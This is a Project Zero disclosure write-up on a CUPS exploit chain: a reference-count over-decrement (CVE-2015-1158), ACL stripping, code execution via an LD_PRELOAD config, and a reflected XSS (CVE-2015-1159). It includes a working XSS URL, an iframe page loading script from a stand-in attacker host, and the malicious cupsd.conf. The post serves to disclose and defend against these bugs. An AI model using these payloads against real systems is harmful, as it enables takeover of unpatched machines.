# Owning Internet Printing - A Case Study in Modern Software Exploitation - Project Zero

Source: https://projectzero.google/2015/06/owning-internet-printing-case-study-in.html
Captured verbatim (article body extracted from HTML) on 2026-11-12.

---

Guest posted by Neel Mehta (nmehta@google.com) - June 19th, 2015

# Abstract

Modern exploit mitigations draw attackers into a game of diminishing marginal returns. With each additional mitigation added, a subset of software bugs become unexploitable, and others become difficult to exploit, requiring application or even bug-specific knowledge that cannot be reused. The practical effect of exploit mitigations against any given bug or class of bugs is the subject of great debate amongst security researchers.

Despite mitigations, skilled and determined attackers alike remain undeterred. They cope by finding more bugs, and by crafting increasingly complex exploit chains. Attackers treat these exploits as closely-guarded, increasingly valuable secrets, and it's rare to see publicly-available full-fledged exploit chains. This visibility problem contributes to an attacker's advantage in the short term, but hinders broader innovation.

In this blog post, I describe an exploit chain for several bugs I discovered in [CUPS](https://www.cups.org/), an open-source printing suite. I start by analyzing a relatively-subtle bug in CUPS string handling (CVE-2015-1158), an exploit primitive. I discuss key design and implementation choices that contributed to this bug. I then discuss how to build an exploit using the primitive. Next, I describe a second implementation error (CVE-2015-1159) that compounds the effect of the first, exposing otherwise unreachable instances of CUPS. Finally, I discuss the specific features and configuration options of CUPS that either helped or hindered exploitation.

By publishing this analysis, I hope to encourage transparent discourse on the state of exploits and mitigations, and inspire other researchers to do the same.

# Summary

Cupsd uses reference-counted strings with global scope. When parsing a print job request, cupsd can be forced to over-decrement the reference count for a string from the request. As a result, an attacker can prematurely free an arbitrary string of global scope. I use this to dismantle ACL's protecting privileged operations, upload a replacement configuration file, then run arbitrary code.

The reference count over-decrement is exploitable in default configurations, and does not require any special permissions other than the basic ability to print. A cross-site scripting bug in the CUPS templating engine allows this bug to be exploited when a user browses the web. The XSS is reachable in the default configuration for Linux instances of CUPS, and allows an attacker to bypass default configuration settings that bind the CUPS scheduler to the 'localhost' or loopback interface.

Exploitation is near-deterministic, and does not require complex memory-corruption 'acrobatics'. Reliability is not affected by traditional exploit mitigations.

# Background

## What is CUPS?

[CUPS](http://www.cups.org/)is a modular, feature-rich open-source printing system for Unix-based OS's. It abstracts the internals of printing a multitude of file formats on a multitude of printer hardware, reducing the need for printer-specific drivers.

CUPS is maintained by Apple, and runs on Linux, BSD, and variant OS's like Mac OS X. It is widely-deployed on desktops, laptops, network print servers, and even some embedded systems. CUPS is the reference implementation for [IPP/2.0 and IPP/2.1](http://en.wikipedia.org/wiki/Internet_Printing_Protocol), the latest replacement for LPD / LPR printing. The source tree for CUPS is large and complex, but not uniquely so, at more than 100,000 lines of ANSI C.

## CUPS String Allocation Internals

CUPS makes widespread use of strings with managed-code-like properties. These strings are allocated by '\_cupsStrAlloc()' (see cups/string.c:50),  which is used like 'strdup(3)', with one fundamental difference: strings are de-duplicated by content and reference counted.

Strings are owned by a global hash table (a 'cups\_array\_t' / '\_cups\_array\_s' structure, defined in cups/array.c:39). '\_cupsStrAlloc()' first checks the hash table for its input string (by content). If the string is in the hash table, it has been previously allocated, and its reference count is incremented. The existing string pointer (from the global array) is returned. If not found in the global hash table, a new heap block is allocated and populated, then inserted with a single reference.

To be clear, if two disparate functions call '\_cupsStrAlloc()' for the same string content, they each get and share the same pointer to a single heap block.

When a string is allocated by '\_cupsStrAlloc()', it must be released by a call to '\_cupsStrFree()' (see cups/string.c:289). This function decrements the reference count, and if none remain it removes the string from the global hash table and frees the block, releasing it back to the allocator. '\_cupsStrFree()' ignores pointers that aren't in the global hash table. This is fortuitous for exploitation, turning a historical vanilla double-free into a fault-resistant exploit primitive with global, content-targeted scope.

# Reference Count Over-Decrement Issue

## Proper IPP Attribute Teardown

IPP attributes are name-value pairs. They are typed (bool, integer, date, string, etc...), and can be organized in groups. Attributes can have multiple values (one name, associated with multiple values). Attribute types 'IPP\_TAG\_TEXTLANG' and 'IPP\_TAG\_NAMELANG' are localized. The character set for these attributes is specified once in the wire protocol, even when the attribute has multiple values (ie all values in the group use the charset).

Cups saves attributes in an 'ipp\_attribute\_t' / '\_ipp\_attribute\_s' structure:

cups/ipp.h:674:

typedef struct \_ipp\_attribute\_s ipp\_attribute\_t;

cups/ipp.h:789:

struct \_ipp\_attribute\_s     /\*\*\*\* Attribute \*\*\*\*/

{

ipp\_attribute\_t \*next;    /\* Next attribute in list \*/

ipp\_tag\_t group\_tag,    /\* Job/Printer/Operation group tag \*/

value\_tag;    /\* What type of value is it? \*/

char    \*name;      /\* Name of attribute \*/

int   num\_values;   /\* Number of values \*/

\_ipp\_value\_t  values\[1\];    /\* Values \*/

};

The 'values' structure member holds a minimum of a single value. For multiple attributes, 'next' points to another attribute structure, containing the next value.

'\_ipp\_value\_t' is defined as:

cups/ipp.h:751:

typedef union \_ipp\_value\_u    /\*\*\*\* Attribute Value \*\*\*\*/

{

\<portions omitted>

struct

{

char  \*language;    /\* Language code \*/

char  \*text;      /\* String \*/

}   string;     /\* String with language value \*/

\<portions omitted>

} \_ipp\_value\_t;

typedef \_ipp\_value\_t ipp\_value\_t; /\*\*\*\* Convenience typedef that will be removed @private@ \*\*\*\*/

IPP requests are made up of groups of attributes, sent in an HTTP request body. When cupsd receives a request, it parses all attribute groups in the request immediately, storing them all in an 'ipp\_t' structure (defined in cups/ipp.h:799). String attributes are added to this structure by

'ippAddStrings()'. For multi-value localized string attributes, the first value's '\_ipp\_value\_t.string.language' field is populated by '\_cupsStrAlloc()' (which ups the refcount once).

In a quirky but sweet "academic" implementation choice, subsequent values have their '\_ipp\_value\_t.string.language' field shallow-copied from the first value (the refcount is not increased). This mirrors a design choice in the wire protocol, whereby IPP saves bytes on the wire by including the charset only once for a group of values.

cups/ipp.c:1316:

/\*

\* Initialize the attribute data...

\*/

for (i = num\_values, value = attr->values;

i > 0;

i --, value ++)

{

if (language)

{

if (value == attr->values)

{

if ((int)value\_tag & IPP\_TAG\_CUPS\_CONST)

value->string.language = (char \*)language;

else

value->string.language = \_cupsStrAlloc(ipp\_lang\_code(language, code,    ←  increases refcount

sizeof(code)));

}

else

value->string.language = attr->values\[0\].string.language;             ←  shallow copy

}

To free this type of attribute correctly, '\_cupsStrFree()' should be called once, on the first value's 'string.language' pointer.. IPP attributes are usually freed by a purpose-built routine 'ippDeleteAttribute()', which calls 'ipp\_free\_values()' to free the language correctly:

cups/ipp.c:6480:

switch (attr->value\_tag)

{

case IPP\_TAG\_TEXTLANG :

case IPP\_TAG\_NAMELANG :

if (element == 0 && count == attr->num\_values &&

attr->values\[0\].string.language)

{

\_cupsStrFree(attr->values\[0\].string.language);         ←  release language only once here

attr->values\[0\].string.language = NULL;

}

/\* Fall through to other string values \*/

case IPP\_TAG\_TEXT :

case IPP\_TAG\_NAME :

case IPP\_TAG\_RESERVED\_STRING :

case IPP\_TAG\_KEYWORD :

case IPP\_TAG\_URI :

case IPP\_TAG\_URISCHEME :

case IPP\_TAG\_CHARSET :

case IPP\_TAG\_LANGUAGE :

case IPP\_TAG\_MIMETYPE :

for (i = count, value = attr->values + element;          ←  for subsequent values, don't free language again

i > 0;

i --, value ++)

{

\_cupsStrFree(value->string.text);

value->string.text = NULL;

}

break;

## Improper Teardown - Reference Count Over-Decrement (CVE-2015-1158)

When freeing localized multi-value attributes, the reference count on the language string is over-decremented when creating a print job whose 'job-originating-host-name' attribute has more than one value. In 'add\_job()', cupsd incorrectly frees the 'language' field for all strings in a group, instead of using 'ipp\_free\_values()'.

scheduler/ipp.c:1626:

/\*

\* Free old strings…       ←  Even 'old' strings need to be freed.

\*/

for (i = 0; i \< attr->num\_values; i ++)

{

\_cupsStrFree(attr->values\[i\].string.text);

attr->values\[i\].string.text = NULL;

if (attr->values\[i\].string.language)           ←  for all values in an attribute

{

\_cupsStrFree(attr->values\[i\].string.language);     ←  free the 'language' string

attr->values\[i\].string.language = NULL;

}

}

In this case, 'language' field comes from the value of the 'attributes-natural-language' attribute in the request.

To specifically target a string and free it, we send a 'IPP\_CREATE\_JOB' or 'IPP\_PRINT\_JOB' request with a multi-value 'job-originating-host-name' attribute. The number of 'job-originating-host-name' values controls how many times the reference count is decremented. For a 10-value attribute, the reference count for 'language' is increased once, but decremented 10 times.

The over-decrement prematurely frees the heap block for the target string. The actual block address will be quickly re-used by subsequent allocations.

Dangling pointers to the block remain, but the content they point to changes when blocks are freed or reused. This is the basic exploit primitive upon which we build.

# Exploit Strategy

## ACL Implementation

Cupsd allows the main configuration file to be remotely changed via an HTTP PUT request to '/admin/conf/cupsd.conf'. This is a privileged operation, protected by an ACL in the default configuration file:

cupsd.conf:

\# Restrict access to the admin pages...

\<Location /admin>

Order allow,deny

\</Location>

\# Restrict access to configuration files...

\<Location /admin/conf>

AuthType Default

Require user @SYSTEM

Order allow,deny

\</Location>

This 'Location' directive is stored in a global array 'Locations', which is an array of 'cupsd\_location\_t' structures:

scheduler/auth.h:89:

typedef struct

{

char      \*location;  /\* Location of resource \*/

size\_t    length;   /\* Length of location string \*/

ipp\_op\_t    op;   /\* IPP operation \*/

int     limit,    /\* Limit for these types of requests \*/

order\_type, /\* Allow or Deny \*/

type,   /\* Type of authentication \*/

level,    /\* Access level required \*/

satisfy;  /\* Satisfy any or all limits? \*/

cups\_array\_t    \*names,   /\* User or group names \*/

\*allow,   /\* Allow lines \*/

\*deny;    /\* Deny lines \*/

http\_encryption\_t encryption; /\* To encrypt or not to encrypt... \*/  ← Very existential :)

} cupsd\_location\_t;

The 'location' field in each structure holds the path from the 'Location' configuration directive, and fortuitously happens to be a reference counted string.

CUPS matches requests to a 'Location' ACL via 'cupsdFindBest()', which searches for the 'Location' directive that matches the largest canonical portion of the requested path. For example, a 'PUT /admin/conf/cupsd.conf' would match the 'Location' '/admin/conf' better than '/admin', and fall under that (in this case more-restrictive) ACL. If the 'Location' directive for '/admin/conf' didn't exist, the request would instead match the less-specific 'Location' ACL for '/admin', or eventually simply a default ACL for '/'.

The fidelity of string content for 'Location' directives is important, perhaps.

## Use of the Basic Exploit Primitive

I use our basic exploit primitive to target the 'location' path strings in the two 'cupsd\_location\_t' structures for the above-mentioned 'Location' directives.

I over-decrement reference counts on strings '/admin/conf' and '/admin'. The 'location' pointers in the 'cupsd\_location\_t' remain dangling, and point to different content when the block is re-used and overwritten.

As a result, the ACL's fail to match their intended requests. This allows unrestricted access to privileged operations, allowing an un-authenticated user to upload a replacement configuration file.

Here's a gdb dump of the exploit leaking reference counts for '/admin/conf':

(gdb) x/gx 0x7F0D577C7000+0x2639C0

0x7f0d57a2a9c0 \<Locations>: 0x00007f0d5980c8e0

(gdb) x/64gx 0x00007f0d5980c8e0

0x7f0d5980c8e0: 0x0000001000000003  0x0000000000000003

0x7f0d5980c8f0: 0x0000000000000001  0x0000000000000000

0x7f0d5980c900: 0x0000000000000000  0x0000000000000000

\<snip>

0x7f0d5980d120: 0x0000000000000000  0x0000000000000051

0x7f0d5980d130: 0x00007f0d5980d184  0x0000007f00000000

0x7f0d5980d140: 0x0000000100000006  0x0000000000000000

0x7f0d5980d150: 0x0000000000000000  0x0000000000000000

0x7f0d5980d160: 0x0000000000000000  0x0000000000000000

0x7f0d5980d170: 0x0000000000000000  0x0000000000000021

0x7f0d5980d180: 0x6d64612f00000001  0x0000000000006e69

0x7f0d5980d190: 0x0000000000000000  0x0000000000000051

0x7f0d5980d1a0: 0x00007f0d5980d1f4  0x0000007f00000000 ← Pointer to '/admin/conf' here.

0x7f0d5980d1b0: 0x000000010000000b  0x00000001ffffffff

0x7f0d5980d1c0: 0x0000000000000000  0x00007f0d5980d210

0x7f0d5980d1d0: 0x0000000000000000  0x0000000000000000

0x7f0d5980d1e0: 0x0000000000000000  0x0000000000000021

0x7f0d5980d1f0: 0x6d64612f00000001  0x00666e6f632f6e69

0x7f0d5980d200: 0x0000000000000000  0x00000000000000e1

\<snip>

(gdb) x/s 0x00007f0d5980d1f4

0x7f0d5980d1f4: "/admin/conf"

(gdb) x/20i 0x7F0D577C7000+0x12A10  ← Reference count over-decrement code in 'add\_job()'.

0x7f0d577d9a10:  movslq %r14d,%r12

0x7f0d577d9a13:  add    $0x2,%r12

0x7f0d577d9a17:  shl    $0x4,%r12

0x7f0d577d9a1b:  add    %r15,%r12

0x7f0d577d9a1e:  mov    0x8(%r12),%rdi

0x7f0d577d9a23:  callq  0x7f0d577d3010 \<\_cupsStrFree@plt>

0x7f0d577d9a28:  mov    (%r12),%rdi

0x7f0d577d9a2c:  movq   $0x0,0x8(%r12)

0x7f0d577d9a35:  test   %rdi,%rdi

0x7f0d577d9a38:  je     0x7f0d577d9a47

0x7f0d577d9a3a:  callq  0x7f0d577d3010 \<\_cupsStrFree@plt>

0x7f0d577d9a3f:  movq   $0x0,(%r12)

0x7f0d577d9a47:  inc    %r14d

0x7f0d577d9a4a:  jmp    0x7f0d577d9a4f

0x7f0d577d9a4c:  xor    %r14d,%r14d

0x7f0d577d9a4f:  cmp    %r14d,0x18(%r15)

0x7f0d577d9a53:  jg     0x7f0d577d9a10

0x7f0d577d9a55:  lea    0x38(%rbx),%rdi

0x7f0d577d9a59:  movl   $0x42,0xc(%r15)

0x7f0d577d9a61:  movl   $0x1,0x18(%r15)

(gdb) b \*0x7f0d577d9a10

Breakpoint 1 at 0x7f0d577d9a10

(gdb) c

Continuing.

Breakpoint 1, 0x00007f0d577d9a10 in ?? ()

(gdb) display/i $rip

1: x/i $rip

=> 0x7f0d577d9a10:  movslq %r14d,%r12

(gdb) x/16gx $r15

0x7f0d59b422b0: 0x00007f0d59b65ec0  0x0000003600000002

0x7f0d59b422c0: 0x00007f0d59805f44  0x000000000000000d

0x7f0d59b422d0: 0x00007f0d5980d1f4  0x00007f0d59a5a494  ← The same pointer as found in 'Locations'

0x7f0d59b422e0: 0x00007f0d5980d1f4  0x00007f0d59a5a494

0x7f0d59b422f0: 0x00007f0d5980d1f4  0x00007f0d59a5a494

0x7f0d59b42300: 0x00007f0d5980d1f4  0x00007f0d59a5a494

0x7f0d59b42310: 0x00007f0d5980d1f4  0x00007f0d59a5a494

0x7f0d59b42320: 0x00007f0d5980d1f4  0x00007f0d59a5a494

(gdb) x/16gx 0x00007f0d5980d1f4-4

0x7f0d5980d1f0: 0x6d64612f00000007  0x00666e6f632f6e69  ← The current reference count is 7.

0x7f0d5980d200: 0x0000000000000000  0x00000000000000e1

0x7f0d5980d210: 0x0000001000000001  0x00000000ffffffff

0x7f0d5980d220: 0x0000000000000001  0x0000000000000000

0x7f0d5980d230: 0x0000000000000000  0x0000000000000000

0x7f0d5980d240: 0x0000000000000000  0x0000000000000000

0x7f0d5980d250: 0x0000000000000000  0x0000000000000000

0x7f0d5980d260: 0x0000000000000000  0x0000000000000000

(gdb) b \*0x7f0d577d9a55  ← Break after end of loop, after reference count hits zero.

Breakpoint 2 at 0x7f0d577d9a55

(gdb) delete 1

(gdb) c

Continuing.

Breakpoint 2, 0x00007f0d577d9a55 in ?? ()

1: x/i $rip

=> 0x7f0d577d9a55:  lea    0x38(%rbx),%rdi

(gdb) x/16gx 0x7f0d5980d1f0

0x7f0d5980d1f0: 0x00007f0d59a5a2f0  0x00666e6f632f6e69  ← Now a free list pointer (was refcount + string start).

0x7f0d5980d200: 0x0000000000000000  0x00000000000000e1

0x7f0d5980d210: 0x0000001000000001  0x00000000ffffffff

0x7f0d5980d220: 0x0000000000000001  0x0000000000000000

0x7f0d5980d230: 0x0000000000000000  0x0000000000000000

0x7f0d5980d240: 0x0000000000000000  0x0000000000000000

0x7f0d5980d250: 0x0000000000000000  0x0000000000000000

0x7f0d5980d260: 0x0000000000000000  0x0000000000000000

(gdb) x/s 0x7f0d5980d1f4

0x7f0d5980d1f4: "\r\177" ← Actual content unpredictable, but predictably not '/admin/conf'.

(gdb) x/16bx 0x7f0d5980d1f0

0x7f0d5980d1f0: 0xf0  0xa2  0xa5  0x59  0x0d  0x7f  0x00  0x00

0x7f0d5980d1f8: 0x69  0x6e  0x2f  0x63  0x6f  0x6e  0x66  0x00

(gdb) ← PC LOAD LETTER

# Code Execution Via Changes to 'cupsd.conf'

## SetEnv Directives

After using the basic exploit primitive to strip ACL's, I can now specify an arbitrary new configuration file for cupsd. To run arbitrary code via configuration changes, I use the 'SetEnv' directive. Cupsd invokes CGI applications for certain requests, and the 'SetEnv' directive allows us to set arbitrary environment variables for these CGI processes.

For MacOS X targets, we use the 'DYLD\_INSERT\_LIBRARIES' environment variable to load a library off disk into cups CGI requests. On Linux targets, I use the equivalent, 'LD\_PRELOAD':

LogLevel debug2

Listen \*:631

DefaultAuthType None

WebInterface Yes

MaxClients 1024

\<Location />

Allow from \*

Order deny,allow

\</Location>

\<Policy default>

JobPrivateAccess default

JobPrivateValues default

SubscriptionPrivateAccess default

SubscriptionPrivateValues default

\<Limit All>

Order deny,allow

\</Limit>

\</Policy>

\<Policy authenticated>

JobPrivateAccess default

JobPrivateValues default

SubscriptionPrivateAccess default

SubscriptionPrivateValues default

\<Limit All>

Order deny,allow

\</Limit>

\</Policy>

\<Policy kerberos>

JobPrivateAccess default

JobPrivateValues default

SubscriptionPrivateAccess default

SubscriptionPrivateValues default

\<Limit All>

Order deny,allow

\</Limit>

\</Policy>

SetEnv LD\_PRELOAD /var/spool/cups/000000ff

## Seeding Library Files on Disk

To use 'SetEnv' to run code, I need to be able to write a shared library to disk, and do so in a predictable location. Cupsd stores POST bodies to disk in the 'RequestRoot' directory (on MacOS X '/private/var/spool/cups/', on Linux '/var/spool/cups'). The full filename is constructed as follows in 'cupsdReadClient()':

scheduler/client.c:2116:

cupsdSetStringf(&con->filename, "%s/%08x", RequestRoot,

request\_id ++);

con->file = open(con->filename, O\_WRONLY | O\_CREAT | O\_TRUNC, 0640);

Where 'request\_id' is a static integer, counting up from 0 for the lifetime of the process. This introduces some uncertainty into the filenames, but this can be countered by sending many POST requests.

When a POST request is completely received, the request is processed and the temporary file is deleted. However, if the client closes the connection before cupsd receives the entire POST body, the files linger on disk.

On Mac OS X Yosemite with cups-2.0.2, this exploitation method yields root privileges. On some older versions of cups, and on Linux, this technique will yield execution as the 'lp' or '\_lp' user.

# Background on IPP (really just HTTP)

For the purposes of exploitation, IPP is really just HTTP.

RFC 2910, "Internet Printing Protocol/1.1: Encoding and Transport", states the following in Section 4:

HTTP/1.1 \[RFC2616\] is the transport layer for this protocol.

and

It is REQUIRED that a printer implementation support HTTP over the

IANA assigned Well Known Port 631 (the IPP default port), though a

printer implementation may support HTTP over some other port as well.

Cupsd listens on TCP/631, and answers HTTP requests with its own full-featured HTTP server implementation. This includes a full CGI implementation, and a basic template implementation.

## Attack Surface Reduction in CUPS

On desktop machines, cupsd typically listens on a loopback interface, and is not remotely accessible, at least not directly:

\# Only listen for connections from the local machine.

Listen localhost:631

The HTTP features required for basic printing are logically separated from less essential functions, like CGI applications, by the 'WebInterface' configuration setting.

Many Linux distributions ship with the web interface enabled, and as a result expose significantly more attack surface. Here's the setting from /etc/cups/cupsd.conf on Ubuntu 14.10:

\# Web interface setting...

WebInterface Yes

By default on Mac OS X, the web interface is disabled:

\# Web interface setting...

WebInterface No

# XSS and IPP

## CUPS Template Basics

CUPS CGI applications use a simple, custom templating engine for HTML. It substitutes CGI arguments into templates, and supports some basic conditional statements. Here's an example of how it is used, from cgi-bin/jobs.c:93:

/\*

\* Bad operation code...  Display an error...

\*/

cgiStartHTML(cgiText(\_("Jobs")));

cgiCopyTemplateLang("error-op.tmpl");

cgiEndHTML();

The template 'error-op.tmpl' has the following contents:

\<H2 CLASS="title">{?title} {?printer\_name} Error\</H2>

\<P>Error:\</P>

\<BLOCKQUOTE>Unknown operation "{op}"!\</BLOCKQUOTE>

Substitutions are made from CGI arguments denoted in '{braces}'.

## A Reflected XSS in the Web Interface (CVE-2015-1159)

The template engine is only vaguely context-aware, and only supports HTML. Template parsing and variable substitution and escaping are handled in 'cgi\_copy()'.

The template engine has 2 special cases for 'href' attributes from HTML links. The first case 'cgi\_puturi()' is unused in current templates, but the second case ends up being interesting.

The code is found in 'cgi\_puts()', and escapes the following reserved HTML characters:

\<>"'&

These are replaced with their HTML entity equivalents ('<' etc...).

The function contains a curious special case to deal with HTML links in variable values. Here is a code snippet, from cgi-bin/template.c:650:

if (\*s == '\<')

{

/\*

\* Pass \<A HREF="url"> and \</A>, otherwise quote it...

\*/

if (!\_cups\_strncasecmp(s, "\<A HREF=\"", 9))

{

fputs("\<A HREF=\"", out);

s += 9;

while (\*s && \*s != '\"')

{

if (\*s == '&')

fputs("&", out);

else

putc(\*s, out);

s ++;

}

if (\*s)

s ++;

fputs("\">", out);

}

For variable values containing '\<a href="', all subsequent characters before a closing double-quote are subject to less restrictive escaping, where only the '&' character is escaped. The characters \<>', and a closing " would normally be escaped, but are echoed unaltered in this context.

Note that the data being escaped here is client-supplied input, the variable value from the CGI argument. This code may have been intended to deal with links passed as CGI arguments. However, the template engine's limited context-awareness becomes an issue.

Take this example from templates/help-header.tmp:19:

\<P CLASS="l0">\<A HREF="/help/{QUERY??QUERY={QUERY}:}">All Documents\</A>\</P>

In this case, the CGI argument 'QUERY' is already contained inside a 'href' attribute of a link. If 'QUERY' starts with '\<a href="', the double-quote will close the 'href' attribute opened in the static portion of the template. The remainder of the 'QUERY' variable will be interpreted as HTML tags.

Requesting the following URI will demonstrate this reflected XSS:

http://localhost:631/help/?QUERY=%3Ca%20href=%22%20%3E%3Cscript%3Ealert%28%27Linux%20crickets%20chirping%20for%20a%20patch%27%29%3C/script%3E%3C!--&SEARCH=Search

The 'QUERY' parameter is included in the page twice, leading to multiple unbalanced double-quotes. As such, the open comment string '\<!--' is used to yield a HTML page that parses without errors.

## Reaching Otherwise Unreachable Schedulers

This reflected XSS can be used to inject attacker-supplied Javascript cross-origin, bootstrapping exploitation of the string reference count vulnerability for CUPS scheduler instances not directly reachable via the network. For example, CUPS instances bound only to a localhost interface can be exploited when a target user browses the web.

First, I'll try to fetch a page protected by ACL's, to demonstrate the default state. I get an HTTP 403 and an authentication prompt, as expected:


I see that my ACL's are working:


Now, the target user browses the web to some site they're interested in. This site contains an attacker-supplied iframe that triggers the reflected XSS:

\<html>

\<head>

\<title>Right Ho, Jeeves\</title>

\</head>

\<body>

\<img src="triturus\_cristatus.jpg" width="200" height="200">

\<iframe src="http://localhost:631/help/?QUERY=%3Ca%20href=%22%20%3E%3Cscript%20src=%27http://test.evildomain/dronesclub.js%27%3E%3C/script%3E%3C!--&SEARCH=Search" width="1024" height="500" tabindex="-1" title="nothiddeniframe">

\</body>

\</html>

Typically, this would be a hidden iframe, but in this case I visually display exploit debugging output, replacing 'document.body' (it was originally the CUPS help CGI output, which is ironically less informative in this case):


At this point, I have run attacker-supplied javascript in the 'localhost:631' origin, and issued HTTP / IPP requests to exploit the reference count over-decrement bug. To determine if CUPS is owned, I reload the config file page, from the first screen capture. As you can see, I've now successfully exploited a localhost-bound CUPS as the target browses the web. The target (me) is unlikely to have noticed:


# Factors Affecting Scope and Impact

## Vulnerability Lifetimes

The string reference count bug was introduced in CUPS 1.2.0, released mid-2006. All versions since are affected. Given the large number of affected versions, the vast majority of live unpatched CUPS installations contain the vulnerable code. A similar bug, a vanilla double-free, is present in the earliest available CUPS 1.0 versions.

The introduction of the 'WebInterface' configuration setting in CUPS 1.5.0 influences reachability on Mac OS X by default, but not on Linux.

## Printer Configuration

In its initial install state, CUPS does not have a printer installed or configured, a prerequisite for exploitation. Some systems are unlikely to ever have a printer configured. Adding a printer is a privileged operation, and cannot be accomplished without authentication.

To add a printer, a CUPS user must have permission to perform the 'CUPS-Add-Modify-Printer' operation. From any TCP/IP socket connection to cupsd, this requires user credentials on the target machine. CUPS also listens on a Unix domain socket, where adding a printer is implicitly authenticated by the underlying socket.

The following configuration directive from '/etc/cups/cupsd.conf' prevents remotely adding a new printer without authenticating:

\<Limit CUPS-Add-Modify-Printer CUPS-Delete-Printer CUPS-Add-Modify-Class CUPS-Delete-Class CUPS-Set-Default CUPS-Get-Devices>

AuthType Default

Require user @SYSTEM

Order deny,allow

\</Limit>

When a machine prints to a network printer, or shares a locally-attached printer with other computers on a network, a printer will be configured with CUPS. For example, the printer configuration setup UI in the Mac OS X settings pane adds printers to CUPS. If a user has never added a printer or printed anything, they will be unaffected.

## Lack of Chroot, and Minimal Sandboxing

The string reference count vulnerability is triggered in code that runs as 'root'. CUPS launches sub-processes via 'cups-exec', which acts as an interstitial for CGI scripts, and creates a sandbox profile on Mac OS X. On Linux, no sandboxing is used.

## Print Permissions

In order to exploit the vulnerability, the exploit must be delivered from a machine permitted to print. This is strictly defined as having permission to send POST requests to cupsd, and the permission to perform the 'Create-Job' or 'Print-Job' operation.

The ability to send any POST requests to cupsd may be restricted by the following configuration directive from '/etc/cups/cupsd.conf':

\# Restrict access to the server...

\<Location />  ← ACL for path /

Order allow,deny

\</Location>

POST requests to '/printers/\*' match this restriction, which defaults to 'deny'.

Requests to print from 'localhost' are allowed irrespective of configuration. When a machine is purpose-configured as a network print server, an 'Allow' directive would have to be added to the 'Location' directive above to allow any network printing. For more information, see:

As for the permission to 'Create-Job' or 'Print-Job', these operations aren't restricted in the default configuration:

\<Limit Create-Job Print-Job Print-URI Validate-Job>

Order deny,allow

\</Limit>

## Printer Names

In order to craft input to exploit this vulnerability, the name of a configured printer must be known to an attacker. Printer names are not sensitive information, and can be incidentally exposed via other CUPS components like the browser. Knowing a printer name is a basic requirement to print anything.

If the attacker does not know a printer name from some other means, the names of all printers on a machine can be retrieved via the 'CUPS-Get-Printers' operation. This operation is not explicitly mentioned in the default configuration file, and therefore is not explicitly restricted (similar to  'Create-Job' or 'Print-Job').

## Browsers Can Talk IPP

The same-origin policy is an important security barrier that prevents an attacker from meaningfully-interacting directly with cupsd while a user browses the web.

Users who have the CUPS 'WebInterface' disabled are not susceptible to the specific reflected XSS issue.

In theory, universal XSS bugs in browser components could be used in place of this specific XSS to exploit otherwise-unreachable CUPS instances. Ultimately, this is simply to be expected, since IPP is just HTTP at the transport layer.

Excluding same-origin policy restrictions, an attacker could exploit this vulnerability with standard features of the XMLHTTPRequest class in browsers.

A universal XSS could theoretically exploit this bug if it allowed an attacker to do the following:

- Send POST requests cross-origin to localhost:631.
- Specify binary contents in the POST bodies.
- Set the 'Content-Type' header to 'application/ipp'.
- Receive the response body contents from the cupsd server.

## Browser XSS Inspectors

Some browsers, such as Chrome, contain detection for reflected XSS attacks. These features look for client request content that is echoed back verbatim in a server's reply. In general, these XSS detectors are not considered a credible security barrier, but rather a defense-in-depth mechanism. In this case, they appear effective, at least for some templates.

## CUPS and Browser Sandboxes

Many browser sandboxes provide a privileged supervisor that performs HTTP requests on behalf of a unprivileged (potentially untrusted) child process. When enforcement of same-origin-policy restrictions is left to the child process, a compromised child could request that the supervisor send HTTP POST requests to 'cupsd' locally, exploiting it and breaking out of the sandbox.

## CUPS May be Used in Unexpected Places

The exposure of CUPS running on desktop and network print servers is discussed at length, and easily anticipated and patched. However, CUPS may be embedded in unexpected places, where one might not even think to patch them.

For example, CUPS has been adapted for use in OpenWRT:

## Disabling the Web Interface

The CUPS web interface can be disabled by the 'WebInterface' configuration setting. This is a significant attack-surface reduction, and already the default on Mac OS X. Disabling it manually is required for Linux systems:

\# Web interface setting...

WebInterface No

# Upstream Fixes

Apple Fix (April 16, 2015):

Official CUPS fix for downstream vendors (June 8, 2015):

# Project Zero Bug

# Disclosure Timeline

- March 20th, 2015 - Initial notification to Apple
- April 16th, 2015 - Apple ships fix in Mac OS X 10.10.3
- June 8th, 2015 - CUPS ships official fix in CUPS 2.0.3
- June 18th, 2015 - Disclosure + 90 days
- June 19th, 2015 - P0 publication

# Attack Surface Reduction in CUPS 2.0.3+

CUPS 2.0.3 and 2.1 beta contains several prescient implementation changes to limit the risk and impact of future similar bugs:

- Configuration value strings are now logically separated from the string pool, allocated by strdup() instead.
- LD\_\* and DYLD\_\* environment variables are blocked when CUPS is running as root.
- The localhost listener is removed when 'WebInterface' is disabled (2.1 beta only).

# Acknowledgements

Thanks to Ben Hawkes, Stephan Somogyi, and Mike Sweet for their comments and edits.

# Conclusion

No one prints anything anymore anyways.
